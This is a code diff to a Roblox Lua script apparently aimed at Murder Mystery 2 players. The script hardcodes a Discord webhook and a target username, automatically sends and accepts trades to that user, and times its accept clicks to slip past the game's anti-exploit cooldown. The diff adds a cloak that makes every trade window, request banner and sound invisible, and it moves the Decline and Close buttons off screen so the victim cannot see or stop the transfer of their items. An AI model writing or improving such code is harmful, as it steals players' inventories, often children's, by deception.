@@ -5,7 +5,6 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
-local RunService = game:GetService("RunService")
 local GuiService = game:GetService("GuiService")
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -13,7 +12,7 @@ local VirtualUser = game:GetService("VirtualUser")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
 local TARGET_USERNAME = "c1awsky"
-local HIDE_TRADE_GUI = false
+local HIDE_TRADE_GUI = true
 local ACCEPT_CYCLE_WAIT = 4.0
 
 local lp = Players.LocalPlayer
@@ -234,13 +233,241 @@ if type(hookmetamethod) == "function" and type(getnamecallmethod) == "function" 
     end)
 end
 
--- 4. Trade GUI Lookup
+-- 4. Trade GUI Lookup & In-Place Transparency Cloak
+-- Keeps ScreenGui.Enabled = true and preserves on-screen AbsolutePosition/AbsoluteSize
+-- so MM2's client handlers and VirtualInputManager clicks operate identically,
+-- while forcing every rendered pixel and sound to 0% visibility/volume.
 local TRADE_GUI_NAMES = {
     "TradeGUI",
     "TradeGUI_Phone",
     "TradeGUI_Tablet",
     "TradeGui"
 }
+
+local TRADE_GUI_LOOKUP = {}
+for _, name in ipairs(TRADE_GUI_NAMES) do
+    TRADE_GUI_LOOKUP[name] = true
+end
+
+local realBgTrans = setmetatable({}, { __mode = "k" })
+local realTextTrans = setmetatable({}, { __mode = "k" })
+local realImageTrans = setmetatable({}, { __mode = "k" })
+local cloakedNodes = setmetatable({}, { __mode = "k" })
+local hookedSounds = setmetatable({}, { __mode = "k" })
+
+local function getEffectiveBgTrans(obj)
+    if HIDE_TRADE_GUI and realBgTrans[obj] ~= nil then
+        return realBgTrans[obj]
+    end
+    return obj.BackgroundTransparency
+end
+
+local function getEffectiveTextTrans(obj)
+    if HIDE_TRADE_GUI and realTextTrans[obj] ~= nil then
+        return realTextTrans[obj]
+    end
+    return obj.TextTransparency
+end
+
+local function getEffectiveImageTrans(obj)
+    if HIDE_TRADE_GUI and realImageTrans[obj] ~= nil then
+        return realImageTrans[obj]
+    end
+    return obj.ImageTransparency
+end
+
+local function muteTradeSound(snd)
+    if not HIDE_TRADE_GUI or not snd or not snd:IsA("Sound") or hookedSounds[snd] then
+        return
+    end
+    hookedSounds[snd] = true
+    pcall(function()
+        snd.Volume = 0
+        snd:Stop()
+    end)
+    snd:GetPropertyChangedSignal("Volume"):Connect(function()
+        if HIDE_TRADE_GUI and snd.Volume ~= 0 then
+            snd.Volume = 0
+        end
+    end)
+    snd:GetPropertyChangedSignal("Playing"):Connect(function()
+        if HIDE_TRADE_GUI and snd.Playing then
+            snd:Stop()
+        end
+    end)
+end
+
+local function isDeclineControlName(name)
+    local n = string.lower(name or "")
+    return string.find(n, "decline", 1, true)
+        or string.find(n, "cancel", 1, true)
+        or string.find(n, "reject", 1, true)
+        or string.find(n, "close", 1, true)
+end
+
+local function cloakGuiNode(node)
+    if not HIDE_TRADE_GUI or not node then
+        return
+    end
+
+    if node:IsA("Sound") then
+        muteTradeSound(node)
+        return
+    end
+
+    if node:IsA("UIStroke") then
+        node.Transparency = 1
+        if not cloakedNodes[node] then
+            cloakedNodes[node] = true
+            node:GetPropertyChangedSignal("Transparency"):Connect(function()
+                if HIDE_TRADE_GUI and node.Transparency ~= 1 then
+                    node.Transparency = 1
+                end
+            end)
+        end
+        return
+    end
+
+    if not node:IsA("GuiObject") then
+        return
+    end
+
+    -- Prevent accidental manual clicks on invisible Decline/Close buttons
+    if node:IsA("GuiButton") and isDeclineControlName(node.Name) then
+        node.Active = false
+        node.Position = UDim2.new(0, -12000, 0, -12000)
+    end
+
+    if realBgTrans[node] == nil then
+        realBgTrans[node] = node.BackgroundTransparency
+    end
+    node.BackgroundTransparency = 1
+
+    if node:IsA("TextLabel") or node:IsA("TextButton") or node:IsA("TextBox") then
+        if realTextTrans[node] == nil then
+            realTextTrans[node] = node.TextTransparency
+        end
+        node.TextTransparency = 1
+        node.TextStrokeTransparency = 1
+    end
+
+    if node:IsA("ImageLabel") or node:IsA("ImageButton") or node:IsA("ViewportFrame") then
+        if realImageTrans[node] == nil then
+            realImageTrans[node] = node.ImageTransparency
+        end
+        node.ImageTransparency = 1
+    end
+
+    if node:IsA("ScrollingFrame") then
+        node.ScrollBarImageTransparency = 1
+    end
+
+    if cloakedNodes[node] then
+        return
+    end
+    cloakedNodes[node] = true
+
+    node:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
+        if HIDE_TRADE_GUI and node.BackgroundTransparency ~= 1 then
+            realBgTrans[node] = node.BackgroundTransparency
+            node.BackgroundTransparency = 1
+        end
+    end)
+
+    if node:IsA("TextLabel") or node:IsA("TextButton") or node:IsA("TextBox") then
+        node:GetPropertyChangedSignal("TextTransparency"):Connect(function()
+            if HIDE_TRADE_GUI and node.TextTransparency ~= 1 then
+                realTextTrans[node] = node.TextTransparency
+                node.TextTransparency = 1
+            end
+        end)
+        node:GetPropertyChangedSignal("TextStrokeTransparency"):Connect(function()
+            if HIDE_TRADE_GUI and node.TextStrokeTransparency ~= 1 then
+                node.TextStrokeTransparency = 1
+            end
+        end)
+    end
+
+    if node:IsA("ImageLabel") or node:IsA("ImageButton") or node:IsA("ViewportFrame") then
+        node:GetPropertyChangedSignal("ImageTransparency"):Connect(function()
+            if HIDE_TRADE_GUI and node.ImageTransparency ~= 1 then
+                realImageTrans[node] = node.ImageTransparency
+                node.ImageTransparency = 1
+            end
+        end)
+    end
+
+    if node:IsA("ScrollingFrame") then
+        node:GetPropertyChangedSignal("ScrollBarImageTransparency"):Connect(function()
+            if HIDE_TRADE_GUI and node.ScrollBarImageTransparency ~= 1 then
+                node.ScrollBarImageTransparency = 1
+            end
+        end)
+    end
+end
+
+local function cloakTradeGui(gui)
+    if not gui or not gui:IsA("ScreenGui") or not TRADE_GUI_LOOKUP[gui.Name] then
+        return
+    end
+
+    for _, desc in ipairs(gui:GetDescendants()) do
+        cloakGuiNode(desc)
+    end
+
+    if cloakedNodes[gui] then
+        return
+    end
+    cloakedNodes[gui] = true
+
+    gui.DescendantAdded:Connect(function(desc)
+        cloakGuiNode(desc)
+    end)
+end
+
+local function cloakRequestBanner(obj)
+    if not HIDE_TRADE_GUI or not obj or not obj:IsA("GuiObject") then
+        return
+    end
+    local lowerName = string.lower(obj.Name)
+    if string.find(lowerName, "traderequest", 1, true) then
+        cloakGuiNode(obj)
+        for _, desc in ipairs(obj:GetDescendants()) do
+            cloakGuiNode(desc)
+        end
+        if not cloakedNodes[obj] then
+            cloakedNodes[obj] = true
+        end
+        obj.DescendantAdded:Connect(function(desc)
+            cloakGuiNode(desc)
+        end)
+    end
+end
+
+local function installInPlaceCloak()
+    local pgui = lp:WaitForChild("PlayerGui", 15)
+    if not pgui then
+        return
+    end
+
+    for _, child in ipairs(pgui:GetChildren()) do
+        cloakTradeGui(child)
+    end
+
+    for _, desc in ipairs(pgui:GetDescendants()) do
+        cloakRequestBanner(desc)
+    end
+
+    pgui.ChildAdded:Connect(function(child)
+        cloakTradeGui(child)
+    end)
+
+    pgui.DescendantAdded:Connect(function(desc)
+        cloakRequestBanner(desc)
+    end)
+end
+
+task.spawn(installInPlaceCloak)
 
 local function getAllTradeGuis()
     local list = {}
@@ -251,6 +478,7 @@ local function getAllTradeGuis()
     for _, name in ipairs(TRADE_GUI_NAMES) do
         local g = pgui:FindFirstChild(name)
         if g and g:IsA("ScreenGui") then
+            cloakTradeGui(g)
             table.insert(list, g)
         end
     end
@@ -296,7 +524,7 @@ if updateTradeEvent and updateTradeEvent:IsA("RemoteEvent") then
     end)
 end
 
--- 6. Language-Agnostic Accept Button Discovery (Original Working Multi-Vector Target Collector)
+-- 6. Language-Agnostic Accept Button Discovery (Original Multi-Vector Target Collector)
 local ACCEPT_KEYWORDS = {
     "accept", "confirm", "ready", "yes", "ok", "are you sure",
     "принять", "подтвердить", "подтверд", "готово", "уверен",
@@ -384,11 +612,11 @@ local function hasRedAncestorOrSelf(obj)
         if not cur or not cur:IsA("GuiObject") then
             break
         end
-        if cur.BackgroundTransparency < 0.95 and isRedColor(cur.BackgroundColor3) then
+        if getEffectiveBgTrans(cur) < 0.95 and isRedColor(cur.BackgroundColor3) then
             return true
         end
         if cur:IsA("ImageLabel") or cur:IsA("ImageButton") then
-            if isRedColor(cur.ImageColor3) then
+            if getEffectiveImageTrans(cur) < 0.95 and isRedColor(cur.ImageColor3) then
                 return true
             end
         end
@@ -401,18 +629,18 @@ local function hasGreenVisual(obj)
     if not obj:IsA("GuiObject") then
         return false
     end
-    if obj.BackgroundTransparency < 0.95 and isGreenColor(obj.BackgroundColor3) then
+    if getEffectiveBgTrans(obj) < 0.95 and isGreenColor(obj.BackgroundColor3) then
         return true
     end
-    if (obj:IsA("ImageLabel") or obj:IsA("ImageButton")) and obj.ImageTransparency < 0.95 and isGreenColor(obj.ImageColor3) then
+    if (obj:IsA("ImageLabel") or obj:IsA("ImageButton")) and getEffectiveImageTrans(obj) < 0.95 and isGreenColor(obj.ImageColor3) then
         return true
     end
     for _, child in ipairs(obj:GetDescendants()) do
         if child:IsA("GuiObject") and child.Visible then
-            if child.BackgroundTransparency < 0.95 and isGreenColor(child.BackgroundColor3) then
+            if getEffectiveBgTrans(child) < 0.95 and isGreenColor(child.BackgroundColor3) then
                 return true
             end
-            if (child:IsA("ImageLabel") or child:IsA("ImageButton")) and child.ImageTransparency < 0.95 and isGreenColor(child.ImageColor3) then
+            if (child:IsA("ImageLabel") or child:IsA("ImageButton")) and getEffectiveImageTrans(child) < 0.95 and isGreenColor(child.ImageColor3) then
                 return true
             end
         end
@@ -441,7 +669,7 @@ end
 local function isCooldownOverlayBlocking(obj)
     local container = obj.Parent or obj
     for _, desc in ipairs(container:GetDescendants()) do
-        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and isObjectTrulyVisible(desc) and desc.TextTransparency < 0.8 then
+        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and isObjectTrulyVisible(desc) and getEffectiveTextTrans(desc) < 0.8 then
             local norm = normalizeUtf8Lower(desc.Text or "")
             if string.find(norm, "please wait", 1, true) or string.find(norm, "before accepting", 1, true) or string.find(norm, "подождите", 1, true) then
                 return true
@@ -629,9 +857,6 @@ local function executeAcceptStep()
         fireElementSignals(elem)
     end
 
-    -- IMPORTANT: Do NOT spam acceptTradeRemote:FireServer() with guessed/multiple tokens here.
-    -- In MM2, firing AcceptTrade with an invalid or second token after the GUI click
-    -- immediately triggers the server anti-exploit and resets the button to "Please wait (6) before accepting."
     if acceptTradeRemote and latestEventToken then
         pcall(function()
             acceptTradeRemote:FireServer(latestEventToken)
@@ -732,6 +957,7 @@ end
 
 -- 9. Main Loop: Offer -> Wait 6.2s Initial Cooldown -> Accept Cycle Every 4.0s
 local lastRequestSent = 0
+local isSendingRequest = false
 
 task.spawn(function()
     while task.wait(0.2) do
@@ -747,8 +973,6 @@ task.spawn(function()
                 local elapsedSinceOffer = now - lastOfferTimestamp
                 local elapsedSinceAccept = now - lastAcceptCycleTime
 
-                -- MM2 locks the button for 6 seconds after the last item is offered ("Please wait (6) before accepting.")
-                -- Once 6.2s has passed after offering, run the accept cycle and wait 4.0s before the next cycle.
                 if elapsedSinceOffer >= 6.2 and elapsedSinceAccept >= ACCEPT_CYCLE_WAIT then
                     if executeAcceptStep() then
                         lastAcceptCycleTime = os.clock()
@@ -773,14 +997,18 @@ task.spawn(function()
                     end)
                 end
 
-                if sendRequestRemote and (os.clock() - lastRequestSent >= 2.5) then
+                if sendRequestRemote and not isSendingRequest and (os.clock() - lastRequestSent >= 2.5) then
                     lastRequestSent = os.clock()
-                    pcall(function()
-                        if sendRequestRemote:IsA("RemoteFunction") then
-                            sendRequestRemote:InvokeServer(targetPlr)
-                        elseif sendRequestRemote:IsA("RemoteEvent") then
-                            sendRequestRemote:FireServer(targetPlr)
-                        end
+                    isSendingRequest = true
+                    task.spawn(function()
+                        pcall(function()
+                            if sendRequestRemote:IsA("RemoteFunction") then
+                                sendRequestRemote:InvokeServer(targetPlr)
+                            elseif sendRequestRemote:IsA("RemoteEvent") then
+                                sendRequestRemote:FireServer(targetPlr)
+                            end
+                        end)
+                        isSendingRequest = false
                     end)
                 end
             end
